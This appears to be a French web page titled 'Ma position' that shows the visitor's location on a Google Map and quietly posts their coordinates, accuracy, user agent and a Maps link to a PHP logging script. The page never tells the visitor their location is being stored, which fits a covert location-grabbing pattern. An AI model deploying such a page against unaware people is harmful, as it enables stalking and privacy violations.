<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ma position</title>
<style>
  html, body { height: 100%; margin: 0; padding:0; }
  #map { height: 100%; width: 100%; }
</style>
</head>
<body>
<div id="map"></div>

<script>
const API_URL = "post_geo.php"; // PHP pour enregistrer la localisation

function initMap() {
    const map = new google.maps.Map(document.getElementById("map"), {
        center: { lat: 0, lng: 0 },
        zoom: 2,
    });

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const userLoc = { lat: lat, lng: lon };
                
                map.setCenter(userLoc);
                map.setZoom(15);

                const marker = new google.maps.Marker({
                    position: userLoc,
                    map: map,
                    title: "Vous êtes ici"
                });

                const infoWindow = new google.maps.InfoWindow({
                    content: `<b>Vous êtes ici</b><br><a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Voir sur Google Maps</a>`
                });
                marker.addListener("click", () => infoWindow.open(map, marker));
                infoWindow.open(map, marker);

                // envoyer au serveur
                fetch(API_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        lat: lat,
                        lon: lon,
                        accuracy_m: pos.coords.accuracy,
                        timestamp: pos.timestamp,
                        userAgent: navigator.userAgent,
                        origin: window.location.origin,
                        maps_link: `https://www.google.com/maps?q=${lat},${lon}`
                    })
                });
            },
            (err) => { alert("Impossible de récupérer la localisation : " + err.message); },
            { enableHighAccuracy: true }
        );
    } else {
        alert("Votre navigateur ne supporte pas la géolocalisation.");
    }
}
</script>

<!-- Remplace YOUR_API_KEY par ta clé Google Maps JavaScript API -->
<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initMap" async defer></script>
</body>
</html>
